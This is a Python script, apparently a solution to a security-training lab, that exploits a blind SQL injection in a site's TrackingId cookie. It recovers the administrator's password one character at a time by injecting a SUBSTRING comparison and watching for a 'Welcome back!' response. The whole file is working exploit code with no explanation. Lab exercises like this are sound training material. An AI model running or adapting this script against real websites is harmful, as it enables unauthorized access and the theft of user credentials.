import requests
import sys
import time

if len(sys.argv) != 2:
    print(f"[+] USAGE : {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

URL = sys.argv[1]

dic = "0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
response = requests.get(URL)
tracking_id = response.cookies["TrackingId"]
sess_cookie = response.cookies["session"]

pwd = ""
index = 1
while True:
    found_char = False
    print(f"[-] Index : {index}")
    for char in dic:
        #print(f"[-] Trying character : {char}")
        payload = tracking_id + "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), "+str(index)+", 1) = '" + char
        response = requests.get(URL, headers={"Cookie":"TrackingId="+payload+"; session="+sess_cookie})
        if "Welcome back!" in response.text:
            pwd += char
            print(f"{pwd}")
            found_char = True
            break
        time.sleep(1)
    index += 1
    if not found_char:
        print("[+] Possibly we hit EOP (End Of Password) :)")
        print(f"[+] Possible Password : {pwd}")
        break
